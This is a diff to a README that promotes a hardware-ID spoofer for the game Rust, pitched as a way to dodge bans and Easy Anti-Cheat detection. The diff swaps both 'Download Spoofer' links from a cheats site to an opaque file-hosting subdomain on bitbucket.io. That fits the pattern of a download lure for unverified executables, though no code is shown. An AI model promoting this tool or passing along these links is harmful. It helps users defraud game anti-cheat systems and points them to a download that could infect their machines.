@@ -4,7 +4,7 @@ Got hit with a Rust hardware ban? EAC flags stacking up? Getting insta-kicked th
 
 Whether you're rage cheating or just got flagged for no reason, this tool gives you a **fresh start every time**.
 
-[![Download Spoofer](https://img.shields.io/badge/Download-Spoofer-blueviolet)](https://wecheaters.github.io/cheats/rust/)
+[![Download Spoofer](https://img.shields.io/badge/Download-Spoofer-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 💡 What Is a HWID Spoofer for Rust?
@@ -13,7 +13,7 @@ A **HWID Spoofer** is a cheat tool that masks or replaces your computer’s hard
 
 With a proper spoofer, you trick the game into thinking you're on a **totally new system** — meaning your bans, traces, or detection flags don’t apply anymore.
 
-[![Download Spoofer](https://www.blast.hk/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FBuYVZRn.png&hash=c8ae5c72334b31dbbe081dd0fa184293)](https://wecheaters.github.io/cheats/rust/)
+[![Download Spoofer](https://www.blast.hk/proxy.php?image=https%3A%2F%2Fi.imgur.com%2FBuYVZRn.png&hash=c8ae5c72334b31dbbe081dd0fa184293)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🛠️ Key Features of the Rust HWID Spoofer
